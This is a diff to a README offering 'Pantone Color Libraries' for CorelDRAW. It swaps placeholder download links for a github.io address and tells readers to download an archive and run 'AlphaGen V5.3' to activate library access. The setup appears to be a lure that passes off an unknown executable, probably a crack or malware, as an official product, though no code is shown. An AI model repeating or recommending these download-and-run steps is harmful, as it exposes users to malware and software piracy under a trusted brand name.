@@ -2,13 +2,13 @@
 
 Access official Pantone color libraries inside CorelDRAW for accurate spot color matching, print production, and brand consistency.
 
-[![Download](https://img.shields.io/badge/Download-Pantone_Color_Libraries-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Pantone_Color_Libraries-blueviolet)](https://pantone-color-libraries-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://pantone-color-libraries-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate color library access  
 4. ✅ Open CorelDRAW, go to `Window > Color Palettes > Pantone` to load available swatch books
